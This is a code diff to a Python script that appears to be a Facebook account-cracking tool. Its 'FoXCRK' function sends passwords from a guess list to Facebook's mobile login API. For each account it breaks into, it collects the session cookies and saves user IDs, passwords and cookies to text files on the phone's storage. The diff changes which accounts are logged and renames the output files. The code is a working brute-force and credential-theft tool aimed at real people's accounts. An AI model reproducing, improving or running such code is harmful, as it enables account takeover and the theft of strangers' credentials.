@@ -18,7 +18,7 @@ try:
     import bs4
 except ImportError:
     os.system('pip install bs4')
-       
+    
 #------------------[ ID DATE ]-------------------#
 yellow = "\x1b[38;5;208m"
 black="\033[1;30m"
@@ -216,8 +216,11 @@ def FoXCRK(ids,names,passlist):
                 "X-FB-Server-Cluster": "True",
                 'X-FB-HTTP-Engine': 'Liger',
                 }
+            #print(data)
+            #print(head)
             po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head,allow_redirects=False).text
             load = json.loads(po)
+            print(po)
             if 'session_key' in load:
                 kuki = ";".join(i["name"]+"="+i["value"] for i in load["session_cookies"])
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
@@ -225,14 +228,17 @@ def FoXCRK(ids,names,passlist):
                 ids=str(load['uid'])
                 if load['is_account_confirmed'] == True:
                 	print('\r\r\033[38;5;46m[FOX] '+ids+' | '+pas)
-                print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
+                if load['is_account_confirmed'] == True:
+                	print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
                 linex()
                 if load['is_account_confirmed'] == True:
-                	open('/sdcard/RAKIB-OK-Coki.txt','a').write(f"{ids}|{pas}|{cookie}"'\n')
-                open('/sdcard/RAKIB-OK-UID.txt','a').write(f"{ids}|{pas}"'\n')
+                	open('/sdcard/VERIFY-Coki-RB.txt','a').write(f"{ids}|{pas}|{cookie}"'\n')
+                if load['is_account_confirmed'] == True:
+                	open('/sdcard/VERIFY-UID-RB.txt','a').write(f"{ids}|{pas}"'\n')
                 if load['is_account_confirmed'] == False:
-                	open('/sdcard/RAKIB-OK-Coki-Gamil Not Ok.txt','a').write(f"{ids}|{pas}|{cookie}"'\n')
-                open('/sdcard/RAKIB-OK-UID-Gamil Not Ok.txt','a').write(f"{ids}|{pas}"'\n')
+                	open('/sdcard/NOVREY-Coki-RB.txt','a').write(f"{ids}|{pas}|{cookie}"'\n')
+                if load['is_account_confirmed'] == False:
+                	open('/sdcard/NOVREY-UID-RB.txt','a').write(f"{ids}|{pas}"'\n')
                 oks.append(ids)
                 break
             else:
